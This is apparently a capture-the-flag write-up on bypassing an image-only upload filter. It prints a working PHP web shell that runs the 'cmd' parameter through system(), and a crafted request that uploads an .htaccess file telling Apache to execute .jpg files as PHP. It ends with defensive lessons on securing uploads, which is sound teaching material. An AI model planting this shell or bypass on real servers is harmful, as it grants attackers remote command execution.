# File Upload Bypass via .htaccess 
## Context

If a challenge involved a file upload functionality that only allowed image extensions:

.jpg

.png

.gif

And if the goal was to achieve remote command execution by bypassing the upload restrictions.

## Initial Attempt: Double Extension Upload

first attempt to upload a PHP web shell using a double extension:

shell.php.jpg


The upload was accepted because the file ended with .jpg.

Web Shell Code 
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
## Result

The file uploaded successfully

### PHP code did NOT execute

The server treated .jpg files strictly as images

This indicated that the server was not parsing .jpg files as PHP by default.

## Bypass Technique: .htaccess Upload

To force PHP execution, use Caido/burp to replay/repeat the original image upload request.


### Changed the uploaded filename to:

.htaccess


Modified the request body as follows:
```
Content-Disposition: form-data; name="image"; filename=".htaccess"
Content-Type: image/jpeg

AddHandler application/x-httpd-php .jpg
```

This configuration tells Apache to treat .jpg files as PHP.

## Final Result

Revisiting the previously uploaded shell.php.jpg

The PHP code will be executed by the server

We will obtained a working web shell

## Key Takeaways

Extension filtering alone is insufficient for secure file uploads

*.htaccess* files can be abused if upload restrictions are weak

Server-side handler configuration is critical

Double extensions may upload successfully but still require execution context
